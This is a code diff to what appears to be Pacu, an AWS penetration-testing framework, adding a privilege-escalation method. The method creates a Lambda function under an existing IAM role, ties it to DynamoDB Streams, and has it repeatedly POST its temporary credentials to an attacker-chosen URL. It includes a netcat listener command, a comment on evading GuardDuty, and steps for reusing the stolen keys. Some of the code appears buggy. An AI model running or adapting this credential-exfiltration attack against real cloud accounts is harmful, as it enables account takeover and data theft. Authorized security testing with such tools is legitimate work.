@@ -1418,34 +1418,133 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
     return True
 
 def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
-    # Use `aws dynamodbstreams list-streams` then try to associate them with an existing table/function? Currently I have a stream but no table or function, so don't want to target that
-    # Credential exfiltration from Lambda does not trigger GuardDuty, so can just create one that POST's the keys to a web server everytime it is triggered
-    return
+    print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n')
 
-
-def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-    regions = pacu_main.get_regions('lambda')
-    region = None
-
-    if len(regions) > 1:
-        print('  Found multiple valid regions to use. Choose one below.\n')
-        for i in range(0, len(regions)):
-            print('  [{}] {}'.format(i, regions[i]))
-        choice = input('What region do you want to create the Lambda function in? ')
-        region = regions[int(choice)]
-    elif len(regions) == 1:
-        region = regions[0]
-    else:
+    # Enumerate DynamoDB Streams
+    regions = pacu_main.get_regions('dynamodbstreams')
+    target_region = None
+    if len(regions) == 0:
+        all_dynamodbstreams_regions = pacu_main.get_regions('dynamodbstreams', check_session=False)
         while not region:
-            all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
-            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
-            if not region:
+            target_region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not target_region:
                 return False
-            elif region not in all_lambda_regions:
-                print('    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n'.format(region))
-                print(all_lambda_regions)
-                region = None
+            elif target_region not in all_dynamodbstreams_regions:
+                print('    Region {} is not a valid DynamoDB Streams region. Please choose a valid region. Valid DynamoDB Streams regions include:\n'.format(target_region))
+                print(all_dynamodbstreams_regions)
+                target_region = None
+        regions = [target_region]
+
+    all_streams = {}
+    for region in regions:
+        client = pacu_main.get_boto3_client('dynamodbstreams', region)
+        streams = client.list_streams()['Streams']
+        if len(streams) > 0:
+            all_streams[region] = streams
+    
+    if len(all_streams.keys()) > 1:
+        print('Found {} regions with DynamoDB streams. These are what will trigger your Lambda function, which ultimately leads to you getting credentials. Choose which region below to create the Lambda function in.'.format(len(all_streams.keys())))
+        for i in range(0, len(all_streams.keys())):
+            print('  [{}] {} ({} Streams)'.format(i, all_streams.keys()[i], len(all_streams[all_streams.keys()[i]])))
+        choice = int(input('Choose an option: '))
+        target_region = all_streams.keys()[choice]
+        region_streams = all_streams[target_region]
+    elif len(all_streams.keys()) == 1:
+        target_region = all_streams.keys()[0]
+        region_streams = all_streams[target_region]
+    else:
+        print('Did not find any regions with valid DynamoDB Streams to use. Skipping to next privilege escalation method...\n')
+        return False
+
+    # Import template lambda_function for cred exfil
+    with open('./modules/{}/lambda_function.py.bak'.format(module_info['Name']), 'r') as f:
+        code = f.read()
+
+    print('This privilege escalation method requires you to have some way of receiving HTTP requests and reading the contents of the body to retrieve the temporary credentials associated with the lambda function that will be created.\n')
+    print('Start listening on your server now! Simple command to listen on an open port: "nc -nlvp <port>".\n')
+    print('WARNING: This privilege escalation method will potentially call your function until it is deleted or the DynamoDB Streams are deleted. This can be useful in the sense that if the credentials you exfiltrated expire, you can get a new set, but it is possible for a large amount of requests to be made.\n')
+    their_url = input('Please enter the URL where you would like the credentials POSTed to (example: http://127.0.0.1:8080): ')
+
+    # Replace the placeholder in the local code with their server
+    code = code.replace('THEIR_URL', their_url)
+
+    with open('./modules/{}/lambda_function.py'.format(module_info['Name']), 'w+') as f:
+        f.write(code)
+
+    # Zip the Lambda function
+    try:
+        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(module_info['Name']), './modules/{}/lambda_function.py'.format(module_info['Name'])], shell=True)
+    except Exception as error:
+        print('Failed to zip the Lambda function locally: {}\n'.format(error))
+        return False
+
+    # Create Lambda function
+    try:
+        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='./modules/{}/lambda_function.zip'.format(module_info['Name']), region=target_region)
+    except Exception as error:
+        print('Failed to create a new Lambda function: {}\n'.format(error))
+        return False
+
+    # Set Lambda concurrency limit
+    client = pacu_main.get_boto3_client('lambda', region)
+    try:
+        client.put_function_concurrency(
+            FunctionName=function_name,
+            ReservedConcurrentExecutions=1
+        )
+    except:
+        pass
+
+    # Create Lambda event source mapping
+    print('Creating up to three Lambda event source mappings...\n')
+    count = 0
+    for stream in region_streams:
+        try:
+            client.create_event_source_mapping(
+                FunctionName=function_name,
+                EventSourceArn=stream['StreamArn'],
+                Enabled=True,
+                BatchSize=1,
+                StartingPosition='LATEST'
+            )
+            print('Successfully created the Lambda event source mapping for stream {}!\n'.format(stream['StreamArn']))
+            if count > 2:
+                break
+        except Exception as error:
+            print('Failed to create Lambda event source mapping: {}\n'.format(error))
+            return False
+
+    print('You should now start receiving HTTP requests to your web server that include a set of temporary IAM credentials. Depending on the conditions associated with the DynamoDB Streams, it might take longer than expected. These requests will continue coming until the Lambda function or DynamoDB Streams are deleted or the Lambda event source mapping is deleted from the function. You can enter the exfiltrated credentials into Pacu with the "set_keys" command to try and expand access.\n')
+    return True
+
+
+def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='', region=None):
+    session = pacu_main.get_active_session()
+    
+    if zip_file == '':
+        zip_file = './modules/{}/lambda.zip'.format(module_info['Name'])
+    
+    if region == None:
+        regions = pacu_main.get_regions('lambda')
+
+        if len(regions) > 1:
+            print('  Found multiple valid regions to use. Choose one below.\n')
+            for i in range(0, len(regions)):
+                print('  [{}] {}'.format(i, regions[i]))
+            choice = input('What region do you want to create the Lambda function in? ')
+            region = regions[int(choice)]
+        elif len(regions) == 1:
+            region = regions[0]
+        else:
+            while not region:
+                all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
+                region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+                if not region:
+                    return False
+                elif region not in all_lambda_regions:
+                    print('    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n'.format(region))
+                    print(all_lambda_regions)
+                    region = None
 
     client = pacu_main.get_boto3_client('lambda', region)
 
@@ -1467,7 +1566,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data):
     
     function_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
     
-    with open('./modules/{}/lambda.zip'.format(module_info['Name']), 'rb') as f:
+    with open(zip_file, 'rb') as f:
         lambda_zip = f.read()
 
     response = client.create_function(
